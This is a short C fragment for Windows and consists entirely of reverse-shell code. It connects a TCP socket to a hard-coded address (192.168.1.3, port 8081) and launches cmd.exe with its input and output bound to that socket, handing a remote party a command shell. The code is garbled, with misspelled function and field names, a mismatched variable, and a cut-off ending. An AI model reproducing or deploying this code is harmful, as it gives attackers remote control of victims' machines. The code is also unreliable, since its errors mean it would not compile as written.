int main()
{
    SOCKET shell;
    sockaddr_in shell_addr;
    WSADATA wsa;
    STARTUPINFO si;
    PROCESS_INFORMATION pi;
    char RecvServer[512];
    int connection;
    char ip_addr[] = "192.168.1.3";
    int port = 8081;
    
    WSAStartup9MAKEWORD(2,2), &wsa); // Initialize Winsock
    shell = WSASocket(AF_INET, SOCK_STREAM, IPPROTO_TCP, NULL, (unsigned int)NULL, (unsigned int) NULL); //Create a tcp socket
    shell_addr.sin_port = htons(port);
    shell_addr.sin_family = AF_INET;
    shell_addr.sin_addr.s_addr = inet_addr(ip_addr);
    
    connect = WSAConnect(shell, (SOCKADDR*)&shell_addr, sizeof(shell_addr), NULL , NULL , NULL);
    if (connect == SOCKET_ERROR)
    {
    printf("[!] Connection to the target server failed, PLease try again!\n");
    exit(0);
    }
    else
    {
      recv(shell, RecvServer, sizeof(RecvServer), 0);
      si.cb = sizeof(si);
      si.dwFlags = (STARTF_USESTHANDLES | STARTF_USEHOWWINDOW);
      si.hSInput = si.StdOutput = si.StdError = (HANDLE) shell;
      CreateProcess(NULL, "cmd.exe", NULL , NULL , TRUE, 0 , NULL , NULL , &si, &pi);
      WaitForSingleObject(pi.hProcess, INFINITE);
      CloseHandle(pi.hProcess);
      CloseHandle(pi.hThread);
      memset(RecvServer, 0, sizeof(RecvServer));
      
